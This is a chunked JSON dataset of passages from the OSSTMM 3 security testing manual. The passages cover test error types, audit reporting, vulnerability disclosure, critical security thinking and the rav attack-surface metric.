cannot be countered. The answer changes depending on how and where the question is asked. The target response indicates a particular state as either true or false although in reality the state is dependent upon largely unknown variables 8 Falsification due to target bias. This type of security through obscurity may be dangerous, as the bias will shift when tests come from different vectors or employ different techniques. It is also likely that",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 36
    }
  },
  {
    "text": "either true or false although in reality the state is dependent upon largely unknown variables 8 Falsification due to target bias. This type of security through obscurity may be dangerous, as the bias will shift when tests come from different vectors or employ different techniques. It is also likely that the target is not aware of the bias. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 47\\nError Type Description The answer cannot represent the whole because the scope has been altered. The target is a biased sample of a larger system or a larger number of possible states. This error normally occurs when an authority influences the 9 Sampling Error operational state of the target for the duration of the test. This may be through specific time constraints on the test or a bias of testing only components designated as “important” within a system. This type of error will cause a misrepresentation of the overall operational security. The answer changes depending on the limitations of the tools used. The limitations of human senses or equipment capabilities indicate a 10 Constraint particular state as either true or false although the actual state is unknown. This error is not caused by poor judgment or wrong equipment choices rather it is a failure to recognize imposed constraints or limitations. The answer is presumed to be of one state or the other although no test was made. The Analyst does not make a particular test or has a bias to ignore a particular result due to a presumed outcome. This is often a blinding from experience or a confirmation bias. The test may be repeated many times or the tools and equipment may be modified to have the desired 11 Propagation outcome. As the name implies, a process that receives no feedback where the errors remain unknown or ignored will propagate further errors as the testing continues. Propagation errors may be dangerous because the errors propagated from early in testing may not be visible during an analysis of conclusions. Furthermore, a study of the entire test process is required to discover propagation errors. The answer changes depending on the skill of the Analyst. An error caused by lack of ability, experience, or comprehension is not one of bias and is always a factor that is present, regardless of methodology or technique. While an experienced Analyst may make propagation errors, 12 Human Error one without experience is more likely to not recognize human error, something that experience teaches to recognize and compensate for. Statistically, there is an indirect relationship between experience and human error. The less experience an Analyst has, the greater the amount of human error an audit may contain. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 48\\nWorking with Test Errors During the analysis phase, an Analyst can keep track of the quantity and severity of operation errors from the test. A simple self-assessment can create a margin of operation errors caused during the test which the Analyst can use to either frame",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 37
    }
  },
  {
    "text": "2010, ISECOM, www.isecom.org, www.osstmm.org 48\\nWorking with Test Errors During the analysis phase, an Analyst can keep track of the quantity and severity of operation errors from the test. A simple self-assessment can create a margin of operation errors caused during the test which the Analyst can use to either frame the thoroughness of the current audit or other audits of similar systems. Since it is a self assessment it will have a tendency to be biased. The Analyst should take great care for it to be as factual as possible as a form of quality assurance of the test and the test process. Although some may try to dismiss test errors which were on the fault of the Analyst, keeping track of all errors can only improve future tests and is not something to hide. Errors will happen and are no more than the Analyst’s attempt to interact with an ever-changing system. Regardless of the number and severity of errors, the tracking of test errors will serve as a record of the difficulty and complexity of the audit and the competency of the Analyst to deduce the errors. A record of test errors from the scope will also help sum up the environment in a simplistic way. It is a straight-forward reduction of the Executive Summary which often describes the Analyst’s opinion about the state of security wherein few to no errors will show a fairly static target and environment. Many errors show a chaotic environment and one that may lack controls for managing change or loss. Overall, test error records are useful for understanding the complexity of the audit and change control between audits of regular intervals. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 49\\nTest Results Test results are often accompanied by recommended solutions or consulting offers, neither of which is required in an OSSTMM audit. Recommended solutions may be provided as a value-add to a security test but are not considered mandatory. Often there are no proper solutions based on the limited view an Analyst has of the client environment. Therefore, solutions are not required as part of an OSSTMM audit. Frequently, a test will exceed the limits of a security control. Within an engagement, the Analyst must always report the factual current state of security, any limitations within that current state, and any of the processes which caused those limitations of the applied controls and protections. To measure both the thoroughness of the test and the security of the target, use of this methodology should conclude with the Security Test Audit Report (STAR), available within this manual or at the ISECOM website. STAR requires the following information: 1. Date and time of test 2. Duration of test 3. Names of responsible Analysts 4. Test type 5. Scope of test 6. Index (method of target enumeration) 7. Channel tested 8. Test Vector 9. Attack surface metric 10. Which tests have been completed, not completed, or partially completed, and to what extent 11. Any issues regarding the test",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 38
    }
  },
  {
    "text": "test 3. Names of responsible Analysts 4. Test type 5. Scope of test 6. Index (method of target enumeration) 7. Channel tested 8. Test Vector 9. Attack surface metric 10. Which tests have been completed, not completed, or partially completed, and to what extent 11. Any issues regarding the test and the validity of the results 12. Any processes which influence the security limitations 13. Any unknowns or anomalies Successful use of the OSSTMM shows an actual measurement of security and controls. Misrepresentation of results in reporting may lead to fraudulent verification of security controls, and an inaccurate security level. For this, the Analyst must accept responsibility and limited liability for inaccurate reporting. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 50\\n2.9 Disclosure During a security test the advent of previously unknown or non-publicized security limitations may come to light. What an Analyst does with these is first and foremost a result of the legal regulations of the Analyst’s region and the region where the work is being performed. Disclosure Rights What you do have to do is make sure that your access to and use of the product or solution did not require any sort of provisions, Non-Disclosure contract, or End User License Agreement (EULA) that denies you the right to claim, announce, or distribute any vulnerabilities discovered. If it did and you or the client accepted this contract then you can’t disclose to anyone, perhaps even the manufacturer, without potential legal repercussions. Furthermore if you work for the company making that product or are a legal client of theirs then you may not be able to legally disclose anything either. Furthermore, your rights in any case may be challenged according to the process of law in your region rather than existing legal precedent. Responsibilities However, if those cases do not apply then you effectively own that vulnerability and the sooner you make it public the more rights you have as the owner. In many countries, processes and information can be protected by law and often the legal process requires publication or legally filing such with attribution. If your disclosure can do no PHYSICAL harm (like yelling fire in a crowded movie theater), it is yours to make and no legal posturing need shake you when you’re right. However, to be safest, you should also promote, with the disclosed vulnerability, the controls which one can apply to fix the problem. For example, if it’s a problem with how one authenticates with a solution then suggest an alternative authentication scheme and how it can be successfully integrated. You do not need to wait for the manufacturer to release a fix or a recall to let people fix the problem. However, should you choose to work within the context of notifying the manufacturer, you will need to give them ample time to address the problem before making it public. There is a valid argument that the vulnerability may already be known in criminal circles and need immediate attention. Therefore should you",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 39
    }
  },
  {
    "text": "should you choose to work within the context of notifying the manufacturer, you will need to give them ample time to address the problem before making it public. There is a valid argument that the vulnerability may already be known in criminal circles and need immediate attention. Therefore should you choose to publish without the manufacturer’s assistance, do note that including a fix will also show legally that you had good intentions and much of the legal system focuses on implied intent. Your choice depends on whether frivolous lawsuits are accepted or prevalent in your region. Remember, it is not you the Analyst who is required to do the quality assurance testing for the manufacturer therefore you do not owe them any information from work you’ve done even if it includes their product. Full disclosure is helpful as long as it can do no human, physical harm. Furthermore, consumers should not have to wait on manufacturer fixes for their products to be secure. If the product is not sold as a security specific solution then it’s up to the consumers to make it secure and safe, or not use it. If it is sold as secure and safe then it is up to the manufacturer to fix it however, the consumer may not want to wait until the manufacturer can do so. Full disclosure allows for this choice. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 51\\nThe weakness is not found by analyzing what it is but rather in analyzing what it does. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 52\\nChapter 3 – Security Analysis Security analysis here refers to the skill to turn information into security intelligence. This requires understanding more than just the information but also where it came from, how and when it was collected, and any constraints of the collection process. The final part of the analysis process is to create actionable intelligence, information derived from fact that can be used to make decisions. This is the clear distinction between security and risk analysis. In security analysis, you produce facts even if that fact states something can’t be known from the information provided. In risk analysis, you speculate and derive opinions based on information. Risk analysis can use security analysis to come up with better, more accurate answers however security analysis cannot use risk analysis to improve accuracy. For this reason we recommend trust analysis. Analyzing the Security of Everything The fundamental difference between doing a risk analysis versus a security analysis is that in security analysis you never analyze the threat. This is because assuming you know what threats exist, when they may hit, how they will come, and where they will go is something reserved for risk analysis. In security analysis, you study and measure the attack surface of and around a target. This will allow you then to understand where the threats, any threats, can attack if they do attack. For example, consider a long, high wall. The risk analysis will consider",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 40
    }
  },
  {
    "text": "something reserved for risk analysis. In security analysis, you study and measure the attack surface of and around a target. This will allow you then to understand where the threats, any threats, can attack if they do attack. For example, consider a long, high wall. The risk analysis will consider what can get through the wall but the security analysis will focus on where the cracks are, if the foundation is solid, and if the wall is thick or tall enough to prevent Access long enough for help to arrive and respond to the attack. A security analysis will also allow you to assure the right controls exist, work the way they should, and properly cover the interactive points of the various accessible vectors and channels. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 53\\n3.1 Critical Security Thinking Critical security thinking as used here is a term for the practice of using logic and facts to form an idea about security. That idea may be an answer, a conclusion, or a characterization of something or someone so that verification tests can be well defined. As an answer or a conclusion, critical security thinking will provide that which makes the most sense. As a characterization, it will show you what you need to verify, according to what you need to verify, according to what vector, how, and what the targets will be. It will also help you respect different opinions or viewpoints beyond security itself to the interconnectedness security makes with people, places, processes, and money. It will help you address contradictory conclusions and explore alternate consequences. So even if the critical security thinking model can’t provide an answer it should tell you what facts are still missing and from where you need to get them. The process of critical security thinking is dependent on the Analyst being able to discern true statements or at least recognize the degree of possible falsity or dynamic properties in a statement. One way to do this is to recognize the amount of trust you can have in a fact through the use of trust metrics. Another way is to be able to deconstruct a statement, separating out fallacious arguments. In practice, an Analyst will need to do both. The Analyst will need to have a good understanding of what is being analyzed and a good understanding of logical fallacies used to make qualifiers, statements based on fallacious concepts usually in the form of axioms or best practices. The Six Step Analysis Technique Unfortunately, the world is not prescriptive. Not every question has a right answer. The correctness of an answer is dependent on many things including, most importantly, how it is asked. This is a problem affecting all industries but none so obviously as security which is why critical security thinking is so important. As a technique for analysis it can be reduced to 6 simple steps to ascertain factual results with a high trust level for correctness even when solutions are not linear",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 41
    }
  },
  {
    "text": "a problem affecting all industries but none so obviously as security which is why critical security thinking is so important. As a technique for analysis it can be reduced to 6 simple steps to ascertain factual results with a high trust level for correctness even when solutions are not linear like when there is no connection from point A to point B. Therefore the ability to validate sources and measure trust is crucial for making proper, actionable intelligence out of tests. In these steps, “target” refers to whatever you are analyzing in preparation of a test, be it people, computers, buildings, or processes. 1. Build your knowledge of the target from a variety of the most contemporary, factual resources while avoiding commercially biased and speculative information. 2. Determine the global level of experience for the type of target and the amount of information possibly known about it. 3. Determine any bias or ulterior motives in the information sources. 4. Translate jargon from information sources to similar or known words for comparison because what may sound new or complicated may just be a trick to differentiate something common. 5. Be sure the test equipment has been properly calibrated and the test environment verified to assure the results are not contaminated by the test itself. 6. Assure that the translation state of tools or test processes has been removed as much as possible so that the results do not come from the indirect sources in a process or the pre-analysis from some tools. What’s most important to understand here is when making a characterization don’t worry about being right. It’s more important to be right about being wrong or right which means the right tests were made to verify the characterization. Then if the characterization is wrong we at least know for sure it is wrong and can re-characterize. That’s how the scientific method works. It’s not about believing or relying on your experience, no matter how vast, but on knowing facts we can build upon. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 54\\nFallacies as Qualifiers An additional problem of the humanization of testing into an art form rather than handled as a science is that it introduces all sorts of new errors. Understanding our own limitations as humans and how we think influences how security can be perceived and defined. This leads many security professionals to provide qualifiers for what they don’t understand or can’t deliver. Most often though they are just repeated as axioms without further thought, eventually accepted as truths of security. This further hurts our ability to provide proper security because our analysis is perverted by catch phrases and best practices that may have no basis in fact now or ever. For example, some common axioms still in use will seem much less like golden rules and more like excuses when put to the light of critical security thing. These axioms are so common because there is a general inability to think critically about security or separate",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 42
    }
  },
  {
    "text": "fact now or ever. For example, some common axioms still in use will seem much less like golden rules and more like excuses when put to the light of critical security thing. These axioms are so common because there is a general inability to think critically about security or separate it from risk as a concept. Security is not about risk. It is about protection and controls. Risk is about risk. Risk is speculated, contrived, derived, and correlated. Risk is also subjective. Security should not be. To better understand how these qualifiers taint our ability to make good security analysis, we can examine the fallacies in the common qualifiers: 1. There is no such thing as 100% secure. The statement fails to provide conditions such as time and the metric for which percentages can be used as the scale. As a risk statement, it could hold true- “There is no such thing as always being 100% risk free.” because under the definition of risk, even our own bodies are subject to time and self-inflicted injuries. However as a security statement it can have far too many exceptions to be true. 2. Even if you are secure, if an attacker wants in badly enough they’ll get in. The statement fails to provide the condition of time, which for any human attacker would be finite, and includes a form of the equivocation fallacy which qualifies the attacker’s desire. Therefore, if no attacker has entered then they apparently didn’t want in “badly enough”. Furthermore, the statement makes a use of the phrase “get in” too broadly so that the idea is gaining entry but could be further applied to any number of potential, harmful attacks. 3. There is no perfect security. The statement fails to provide the condition of time implying the axiom means “ever” which is itself an absolute and difficult to prove. This short statement also falls into the categories of two logical fallacies, the Nirvana fallacy and the Perfect Solution fallacy. In the Nirvana fallacy, we are mislead to reject something because it cannot be perfect. However, it can be good enough for one’s needs. In the Perfect Solution fallacy, the argument assumes a perfect solution even exists. This assumption is easy to argue in terms of products for those who only understand security concepts in terms of products. In reality, “perfect” is a subjective concept and what may not be perfect for one person may indeed be perfect for another. Within the context of this manual, “perfect” means a perfectly balanced equation when calculating the attack surface consisting of OpSec and Limitations against Controls. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 55\\n4. Security is a process not a product. While this statement is meant to inform those who think of security in terms of products, this catchphrase actually uses the fallacies of False Dilemma and Presumption to persuade. As a False Dilemma, it states that there are only two choices, a product and a process and therefore security",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 43
    }
  },
  {
    "text": "product. While this statement is meant to inform those who think of security in terms of products, this catchphrase actually uses the fallacies of False Dilemma and Presumption to persuade. As a False Dilemma, it states that there are only two choices, a product and a process and therefore security must be one or the other. As a Presumption, the conclusion of the statement is already presumed as a process being the means to security. Together, these fallacies do not allow for products and processes to combine in the formation of security nor does it allow for something else entirely different. In reality, the public definition of security is ill defined and not actually achievable, which is the likely reason for all these axioms in the first place. This leaves room for many interpretations of what security can be and the main reason why the Analyst must commit to an achievable, measurable definition of security. To state then that security is one thing or another is false especially when security itself is undefined and lends itself to standard, dictionary interpretations. It is also why this manual clearly defines security as something measurable. An Analyst is required to apply critical security thinking skills to information as it is provided as well as to statements which are made about the analyzed information to form factual intelligence. Intelligence created in such a manner will provide accurate and unbiased metrics as well as a clear understanding of how security is deficient without the need for qualifiers. 3.2 Recognize the OpSec Model There are two problems with security analysis in practical use on operations. The first is that technology is often far ahead of every Analyst’s ability to understand how all of it works, if this know-how is even possible to obtain under the current closed-box status of most commercial technology products. The second problem is that ironically, the deconstruction of how something works, including business processes, may be illegal in order to protect the financial risk and privacy of the manufacturer from the buyer even though as a user of the product, the buyer may actually need that information to protect themselves from real threats which are probably not their customers. However, even in cases where a technology or process cannot be analyzed directly, the product can be analyzed within the environment with which it interacts. For each vector and channel that is analyzed, the Analyst will be putting an overlay of the OpSec model over the targets. To apply the OpSec model is simply to count the controls for each interactive point of Access or Trust as well as the discovery of opportunity in the form of Visibility. Where a target is an unknown like a black box which can’t be opened, the Analyst needs to address the controls over the system’s interactions in its environment. The process will look like this: 1. What is visible in the scope? What is of possible value that is known? What targets can be determined? 2.",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 44
    }
  },
  {
    "text": "unknown like a black box which can’t be opened, the Analyst needs to address the controls over the system’s interactions in its environment. The process will look like this: 1. What is visible in the scope? What is of possible value that is known? What targets can be determined? 2. What are the interactive Access points to those targets and from what vector or channel? 3. What are the Trusts within the scope and over what vector or channel? 4. Which are the controls for those Accesses and Trusts? 5. Are the controls complete or do they have limitations? Even a quick application of the OpSec model will tell you if an Access or a Trust is balanced with controls. This will tell you the size of the attack surface and which interactive points are open without any controls to govern them. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 56\\n3.3 Look for Pattern Matching as a Sign of Errors If you begin by looking for exactly what you seek then you may only find what you expect to find. This is adequate when looking for matching socks but not so good when looking at the big picture of an attack surface. It is the major problem known as pattern matching, the human trait to skip over steps, sometimes unknowingly, which are considered unnecessary due to an “obvious” outcome. It also makes people see cause and effect where there may be none. It is a blind spot which Analysts will develop after years of doing initial, basic, or redundant tasks. These tasks are made more efficient through short-cuts which affect the quality of the verification tests and ultimately the analysis. For actionable intelligence, a result is only as good as the methods used to get them. Not knowing how you got a particular result will severely limit the action you can take to fix it. When an Analyst uses pattern matching to skip steps, the method cannot be properly known. Still, the desire to “cut to the chase” to get to the meat of a problem while presuming a state which is actually unknown is a problem in many areas of science. Security is no exception. Therefore an Analyst must recognize when tests have been skipped or the data fudged to provide unverified results. To detect pattern matching, examine the test methods and result data for the following: 1. Tests using specific threats instead of a thorough interaction with the attack surface. 2. The lack of details on resulting processes behind interactions with the target. 3. Little or no information about controls for various targets. 4. Only some of the targets are reported for certain tests and those have completely negative results. 5. Targets not tested for reasons which are anecdotal (notes where a person has said there is nothing there to test or has been secured). 6. Tests of targets which have obviously not been secured. 3.4 Characterize the Results The scientific method is not a checklist. It is",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 45
    }
  },
  {
    "text": "negative results. 5. Targets not tested for reasons which are anecdotal (notes where a person has said there is nothing there to test or has been secured). 6. Tests of targets which have obviously not been secured. 3.4 Characterize the Results The scientific method is not a checklist. It is a process which allows for intelligence and imagination. A hypothesis is made and then data is collected through testing and observation to evaluate that hypothesis. In a security test, a hypothesis is essentially made whenever a verification is made against a direct or indirect interactive point in the scope. The Analyst has the empirical data from those tests and must consider if the tests actually verified the hypothesis. Were the right tests made? Were enough tests made? Were the right channels or vectors tested? Were new interactions created that were also then tested? To do this, we characterize the results. To characterize a security test using the scientific method is to discover the properties of the scope to assure the correct tests were made for it. The tester makes a hypothesis as to the interactivity of a point in the attack surface. The test will return that the point is interactive and adds to the attack surface or not interactive and whether it still adds to the attack surface, controls in place, any limitations in those controls, any limitations in the defined security, and any anomalies. At this point the Analyst may be wrong about the function of the process in operation however the Analyst may not be wrong in which tests should be used to verify what the function actually is. This is why both knowledge of the process and creatively imagining the indirect interaction are necessary. For example, the Analyst may characterize a process as including the interaction between a visitor and the network via the access card. So while this visitor does not have the credentials to access the network, because the card reader is tied into the computer system, that visitor does access the network by swiping the card. The Analyst must consider how to test what happens when the visitor interacts with the card reader to gain access as well as the side effects of having the card read. However, even if the tests show that the card reader is connected to a stand-alone computer system and is not attached to the network, Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 57\\nthe Analyst has properly verified that the right tests were made against the right targets to get that answer. Therefore, the Analyst will examine the scope for where an interaction might occur as well as where operations show interactions do occur. This will allow a characterization of the points of interaction, any possible indirect interactions, and all side effects from such interactions. This characterization must be then matched with the tests made to determine if all the correct tests were made. 3.5 Look for Signs of Intuition One thing that machines are clearly better",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 46
    }
  },
  {
    "text": "a characterization of the points of interaction, any possible indirect interactions, and all side effects from such interactions. This characterization must be then matched with the tests made to determine if all the correct tests were made. 3.5 Look for Signs of Intuition One thing that machines are clearly better than humans at is consistency. Humans generally get bored, confused, or careless. When a machine counts coins, it doesn’t lose count and need to start over. It doesn’t doubt itself and start over. It also won’t use intuition. Also called “gut instinct” the power of intuition is incredible. It allows people to imagine, apply creativity to a job, and know when something feels wrong. It’s part of the human condition to subconsciously detect problems and prepare accordingly. However it’s exactly this that sometimes leads us to make mistakes. This is never more obvious than when we count large amounts of similar-looking objects. Without total concentration, we may begin to feel uneasy about the tally and eventually we may feel compelled to either start over or just accept a particular correct-sounding number where we think we left off and continue from there. There is a time when a test requires precise concentration; during a large number of repetitive sequences. Generally, we tend to create tools to handle this type of repetition however it may not always be possible due to the dynamic nature of the test like when interacting with people instead of inanimate objects or machines. So as the test progresses, the tester may use intuition to make the presumption that the test will be unnecessary. The Analyst must pay special attention to these tests and look for signs of intuition in part of the tester. Signs of trouble from intuition in tests are: 1. Inconsistencies of types of tests performed across multiple, similar targets. 2. The number of tests decrease between targets. 3. The length of time for tests decrease between targets. 4. The same target tested more than once with the same tests. Detection of intuition in tests will show an inadequate testing process and the quality of the results should be regarded with suspicion. Re-testing may be necessary. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 58\\n3.6 Transparent Reporting Rarely will a security analysis end with all the answers. Since the tests will depend on the OpSec and controls of a particular channel and vector there will be unknowns. There may be a visible target which provides no interaction and no further information about that target can be determined from this vector and this channel. This is correct. The Analyst should report what has been found with certainty and not merely what could be. There is no place for guessing when measuring an attack surface. In addition to information about the test itself as to how it was made, the Analyst will need to report the following 7 test results: 1. Unknowns As more vectors and channels are analyzed, more information will be available and that which",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 47
    }
  },
  {
    "text": "place for guessing when measuring an attack surface. In addition to information about the test itself as to how it was made, the Analyst will need to report the following 7 test results: 1. Unknowns As more vectors and channels are analyzed, more information will be available and that which is reported will change and provide actionable intelligence. Conversely, maybe more results are inconclusive or the correlation of results provide conflicting answers, the resulting actionable intelligence is unknown. Unknown is a valid answer to report. What cannot be known is as valid and as important in security as what is discovered. What is unknown shows what is difficult to test or analyze. The unknown need not be seen as a failure of the tester rather it may be caused by superior protection or an attack that uses a large cost of time or resources not possible in a test. No Analyst should fear reporting something is unknown. It is a powerful result to base further risk analysis upon. 2. Untested Targets Additionally, the Analyst needs to report another type of unknown - targets in the scope which have not been tested in a particular vector or channel. If a test cannot be completed because of time constraints, tool limitations, targets being unstable, the test environment being too dynamic or too noisy to collect proper results, or because the tests were not wanted by the target owner then this needs to be known. By reporting what was not tested, it is possible to do proper test comparisons with future tests. It will also help avoid cheating by only testing the well protected segment of a scope and ignoring the rest to create the illusion of a small attack surface. 3. Identified and Verified Limitations Besides unknowns, the Analyst must also report any identified and verified limitations such as vulnerabilities in the targets. An identified limitation is one which has been determined through knowledge and correlation. This is useful when the tests themselves are dangerous or very costly. Sometimes a test can be damaging to a target or cause unacceptable or even criminal collateral damage. A verified limitation is one where the problem has been specifically tested to determine if it exists. 4. False Positives and the Means to Generate Them During tests, some identified limitations will not be vulnerable to those particular attacks during verification. This, however does not conclude that the target does not have those limitations. It only means that particular test at that particular time and from that particular tester did not expose the vulnerability as identified. It could also mean the target is vulnerable but is protected by a particular control. Such determined false positives should be reported so that during further development of protective and defensive techniques, the problem can be looked at more closely, particularly from a different vector. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 59\\n5. Failed Security Processes and Procedures During analysis, test results will show more than just the OpSec, types",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 48
    }
  },
  {
    "text": "reported so that during further development of protective and defensive techniques, the problem can be looked at more closely, particularly from a different vector. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 59\\n5. Failed Security Processes and Procedures During analysis, test results will show more than just the OpSec, types of controls, and number of limitations. It will show a bigger picture, one of processes and procedures that are in use to formalize protective measures. These can be about anything that are designed to get the protection measures to their current state. This includes but is not limited to maintenance, procurement, identification, authorization, housekeeping, disaster recovery, partner relations, policy generation, climate control, and human resources. When a target has a limitation often times there is a failed process or procedure behind it. The Analyst should be able to determine exactly what it is from the aggregate test results. 6. Good Practices The term “Best Practices” is used to explain the best way for a person or organization to do something. Unfortunately, this has been abused to the point where it now means that it’s best for everyone. This itself has caused problems and wasted resources. One way to counter this problem is to use the aggregate test results to show practices which are successful. This will show what can be repeated for equivalent success in other areas of the organization and defining a customized “Best Practice” for them. It will also lessen their reliance on industry-wide Best Practices in favor of what works best for them. 7. Compliance Should specific compliance objectives need to be reached, the Analyst needs to use the correlated test results to determine if these objectives have been met. This may need to be provided in a special format as determined by the auditor however the Analyst is best equipped to show which test results provide the necessary information. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 60\\nRisk assessment is a concept for selecting security and controls based on presumed risk. It works for defining strategy. Security testing however is verifying to what completeness that security or those controls exist. It works for defining operations. To test you don’t make a risk assessment because doing so would restrict your potential and your findings. After all, you shouldn’t be making the same guesses they are. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 61\\nChapter 4 – Operational Security Metrics Operational security metrics are the metrics we are most familiar with in our lives. When we measure the height, width, or length of an object we are using an operational metric. When we write the date, have a birthday, or ask the score of a game we are using operational metrics. An operational metric is a constant measurement that informs us of a factual count in relation to the physical world we live in. They are operational because they are numbers we can work with consistently from day to day and person to person. It is difficult to",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 49
    }
  },
  {
    "text": "using operational metrics. An operational metric is a constant measurement that informs us of a factual count in relation to the physical world we live in. They are operational because they are numbers we can work with consistently from day to day and person to person. It is difficult to work with relative or inconsistent measurements like choosing a specific hue of yellow to paint a room, starting work at sunrise, having the right flavor of strawberry for a milkshake, or preparing for the next threat to affect your organization’s profits because the factors have many variables which are biased or frequently changing between people, regions, customs, and locations. For this reason, many professions attempt to standardize such things like flavors, colors, and work hours. This is done through reductionism, a process of finding the elements of such things and building them up from there by quantifying those elements. This way, colors become frequencies, work hours become hours and minutes, flavors become chemical compounds, and an attack surface becomes porosity, controls, and limitations. The only real problem with operational metrics is the requirement for knowing how to properly apply the metric for it to be useful. Using ravs to measure and track the security of anything over time. The completion of a thorough security test has the advantage of providing accurate metrics on the state of security. As with the use of any metric. the less thorough the test, the less accurate the overall metric. Less skilled or less experienced Analysts will also adversely affect the quality of the metric just as people who can’t tell time can’t build clocks, designers without the right tools can’t match colors exactly, and Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 62\\nbrew masters who can’t measure the ingredients in beer can’t make similar batches repeatedly for market. Therefore a successful security metric requires a test which can be described as measuring the appropriate vectors while accounting for inaccuracies and misrepresentations in the collected test data as well as the skills or experience of the security professionals performing the test. Faults in these requirements result in lower quality measurements and false security determinations therefore the metric must also be simple enough to use without making it so simple that it tells nothing. Furthermore, a proper security metric must avoid the biases inherent in risk assessments by assuring measurements have integrity. These qualities have been combined to create the ravs, an unbiased, factual description of an attack surface. 4.1 Getting to Know the Rav The rav is a scale measurement of the attack surface, the amount of uncontrolled interactions with a target, which is calculated by the quantitative balance between operations, limitations, and controls. Having the ravs is to understand how much of the attack surface is exposed. In this scale, 100 rav (also shown as 100% rav for simplicity of understanding although not precisely a percentage) is perfect balance and anything less is too few controls and therefore a greater attack surface. More than",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 50
    }
  },
  {
    "text": "the ravs is to understand how much of the attack surface is exposed. In this scale, 100 rav (also shown as 100% rav for simplicity of understanding although not precisely a percentage) is perfect balance and anything less is too few controls and therefore a greater attack surface. More than 100 rav shows more controls than are necessary which itself may be a problem as controls often add interactions within a scope as well as complexity and maintenance issues. The rav does not measure risk for an attack surface, rather it enables the measurement of it. It cannot say if a particular target will be attacked however it can say where on a target it will be attacked, what types of attacks the target can successfully defend against, how deep an attacker can get, and how much damage can be done. With that information it is then possible to assess the trusts (and risks) much more accurately. The rav is actually multiple separate calculations of Porosity, Controls, and Limitations, that when combined will show the size of an attack surface in two practical ways. The first way is in a straight calculation. It is the calculation of the Delta, a number that describes the specific exposure of that target. This is useful for determining how a new person, thing, or process will change the operational security of a new scope or as a comparison between multiple, single targets. This is also the easiest way to see Perfect Security, the perfect balance between Porosity, Controls, and Limitations. The rav is displayed as a positive or negative number which shows how far away the target is from a perfect security balance. A positive delta shows too much is spent on controls in general or even if the overspending is on too much of one type of control. A negative delta shows a lack of controls or controls themselves with limitations which cannot protect the target adequately. This is a powerful tool for knowing exactly where and how resources are being spent to protect a particular target. However this is not how the rav is most useful; that is done best the second way. The second practical way to display the attack surface is for understanding the big picture. This is represented as Actual Security. Where the Delta calculation is based on perfect balance, the Actual Security calculation uses the Delta but also includes additional and redundant controls to provide a metric more people friendly and familiar. Here the rav representation is similar to how people use percentages. The rav is calculated with a base 10 logarithm, which makes a more comprehensible representation. While the rav is still a balance, perfect balance is set at 100 and calculations are made in respect to that. This will allow most people to have a quick and easy overview of all the targets in a scope or of just a single target in relation to other targets. It is extremely flexible so multiple attack surfaces can",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 51
    }
  },
  {
    "text": "set at 100 and calculations are made in respect to that. This will allow most people to have a quick and easy overview of all the targets in a scope or of just a single target in relation to other targets. It is extremely flexible so multiple attack surfaces can be compared by Actual Security even if the scope or the targets are very different: 95% rav of a scope with 1000 computer systems is comparable to 95% rav with just 10 systems, which can be again compared to a building with a 95% rav. All three will provide the same information to a person that the protection of the target is 5% deficient and therefore exposed to attack. With this knowledge, one can begin to assess risk and determine what is exposed, what is left uncontrolled, and if that 5% is acceptable. So for whatever threat there is, it can only occur where the openings are and that will sharpen the exactness of a risk analysis from broad sword to scalpel. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 63\\nWhat Is a Rav Like? A rav is a little different from other security measurements because the count is unique from the scope. That is like determining the overall size of a person by counting all the cells in them and categorizing them by what they do to determine the person’s overall health. For a rav, both the count and the operation are required. This is why the rav can only be derived from operational security testing. Imagine a machine exists that can audit all the cells in a human body. This machine works by monitoring the cells in their environment and even prodding each cell in a way it can react to better categorize its purpose. We could then see what various cells do and how they contribute to the overall make-up of the human body. Some cells make up 